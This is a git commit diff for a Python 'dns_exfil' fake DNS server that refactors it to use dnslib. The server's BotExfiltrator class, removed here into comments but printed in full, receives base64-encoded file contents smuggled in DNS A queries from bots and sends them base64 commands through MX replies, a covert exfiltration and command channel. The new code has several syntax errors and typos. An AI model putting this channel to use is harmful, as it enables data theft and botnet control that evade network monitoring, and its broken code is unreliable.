92b75990c77b42282703c0e5ffc3e745f2f9bcbb
Cory <cory.is.evil@gmail.com>
2017-07-16 21:36:35 -0500

    Properly utilize dnslib

--- fake-dns-server/dns_exfil/__init__.py
+++ fake-dns-server/dns_exfil/__init__.py
@@ -5,14 +5,28 @@ from os import getcwd
 
 config = {
     'server': {
+        # Settings for this server
         'service': {
-            'listen': '0.0.0.0'
+            'address': '0.0.0.0',
+            'port': 53,
+            'tcp': False
         },
+        # https://github.com/paulchakravarti/dnslib/blob/github/dnslib/intercept.py#L16
+        'upstream': {
+            'address': '8.8.8.8',
+            'port': 53,
+            'ttl': '60s'
+            'intercept': [],
+            'skip': [],
+            'nxdomain': [],
+            'timeout': '5s'
+        }
         'botexfiltrator': {
             'domain': 'def.con',
             'ip': '192.168.1.1',
             'cmd': 'cmd',
-            'basedir': getcwd()
+            'basedir': getcwd(),
+            'ttl': 0
         },
     },
     'client': {
--- fake-dns-server/dns_exfil/server.py
+++ fake-dns-server/dns_exfil/server.py
@@ -2,78 +2,86 @@ import base64
 
 from dns_exfil import config
 
-from dnslib import DNSRecord, RR, QTYPE, A, MX
+import dnslib
+from dnslib.server import DNSServer, BaseResolver
+from dnslib.intercept import InterceptResolver
+
 from socketserver import BaseRequestHandler, UDPServer
 
-class DNSServer(BaseRequestHandler):
+class InterceptDefaultResolver(BaseResolver)
     '''
     Base Class for specific Exfiltrator modes
     Defines default behavior, which acts as a normal DNS server
     Unusual behavior modes should be defined in a subclass of this server.
     '''
-    def __init__(self, request, client_address, server):
+    def __init__(self):
+
+        self.interceptor InterceptResolver(**config['server']['upstream'])
         # link the piece of global config relevant to this instance
         context_name = type(self).__name__.lower()
         self.context = config['server'][context_name]
+        super(BaseResolver, self).__init__()
 
-        # Maps the numerical DNS query type to the handler
-        # There are a lot of relevant RFC's.
-        # https://en.wikipedia.org/wiki/List_of_DNS_record_types
-        self.q_processors = {
-            1: self.A,      # A record
-            12: self.MX,    # PTR record
-            15: self.MX,    # MX record
-            28: self.AAAA   # AAAA record
-            }
-        super(DNSServer, self).__init__(request, client_address, server)
-    def AAAA(self, name):
-        pass
-        
-    def A(self, name):
-        pass
-
-    def MX(self, name):
-        pass
-
-    def handle(self):
-        request = DNSRecord.parse(self.request[0])
-        socket = self.request[1]
-        reply = request.reply()
-        answer = self.q_processors[reply.q.qtype](reply.q.qname)
+    def resolve(self, request, handler):
+        qname = request.q.qname
+        qtype = request.q.qtype
+        # The QTYPE bitmaps numerical record types to it's string value
+        # For example, QTYPE[15] -> 'MX'
+        # See https://en.wikipedia.org/wiki/List_of_DNS_record_types
+        # If a class has a method implemented by this name, we can use it
+        # otherwise, we will just proxy the request upstream.
+        try:
+            query_resolver = getattr(self, QTYPE[qtype])
+            rdata_handler = getattr(dnslib, QTYPE[qype])
+        except AttributeError:
+            return self.interceptor.resolve(request, handler)
+        question_name = str(qname)
+        response = query_resolver(question_name))
+        answer = RR(question_name, qtype, rdata=rdata_handler(response), ttl=self.context['ttl'])
+        reply = request.reply() 
         reply.add_answer(answer)
-        socket.sendto(reply.pack(), self.client_address)
+        return reply
+        
 
-class BotExfiltrator(DNSServer):
-    def __init__(self, request, client_address, server):
-        super(BotExfiltrator, self).__init__(request, client_address, server)
+class BotExfiltrator(InterceptDefaultResolver):
+     def A(self, name):
+         print('received', name)
 
-    def AAAA(self, name):
-        return RR(name, QTYPE.A, rdata=A(self.context['ip']), ttl=0)
 
-    def A(self, name):
-        rfilename = name.label[1].decode('utf-8')
-        host = self.client_address[0]
-        if rfilename == self.context['cmd']:
-            lfilename = rfilename
-        else:
-            lfilename = host + '_' + rfilename
-        try:
-            with open(lfilename, 'a+b') as f:
-                f.write(base64.b64decode(name.label[0]))
-        except:
-            pass
-        return RR(name, QTYPE.A, rdata=A(self.context['ip']), ttl=0)
 
-    def MX(self, name):
-        try:
-            with open(self.context['cmd']) as f:
-                 cmd = base64.standard_b64encode(f.readlines()[-1][:-1].encode('utf-8'))
-        except:
-            cmd = base64.standard_b64encode(bytes(''))
-        return RR(name, QTYPE.MX, rdata=MX(cmd.decode('utf-8') + "." + self.context['domain']), ttl=0)
-
+#class BotExfiltrator(InterceptDefaultResolver):
+#    def __init__(self):
+#        super(BotExfiltrator, self).__init__()
+#
+#    def AAAA(self, name):
+#        return RR(name, QTYPE.A, rdata=A(self.context['ip']), ttl=0)
+#
+#    def A(self, name):
+#        rfilename = name.label[1].decode('utf-8')
+#        host = self.client_address[0]
+#        if rfilename == self.context['cmd']:
+#            lfilename = rfilename
+#        else:
+#            lfilename = host + '_' + rfilename
+#        try:
+#            with open(lfilename, 'a+b') as f:
+#                f.write(base64.b64decode(name.label[0]))
+#        except:
+#            pass
+#        return RR(name, QTYPE.A, rdata=A(self.context['ip']), ttl=0)
+#
+#    def MX(self, name):
+#        try:
+#            with open(self.context['cmd']) as f:
+#                 cmd = base64.standard_b64encode(f.readlines()[-1][:-1].encode('utf-8'))
+#        except:
+#            cmd = base64.standard_b64encode(bytes(''))
+#        return RR(name, QTYPE.MX, rdata=MX(cmd.decode('utf-8') + "." + self.context['domain']), ttl=0)
+#
 
 # Run the actual server. 
-def start_server(listen, handler):
-    server = UDPServer((listen, 53), handler)
-    server.serve_forever()
+
+
+def start_server(resolver)
+    server = DNSServer(resolver=resolver, **config['server']['service'])
+    server.start_thread()
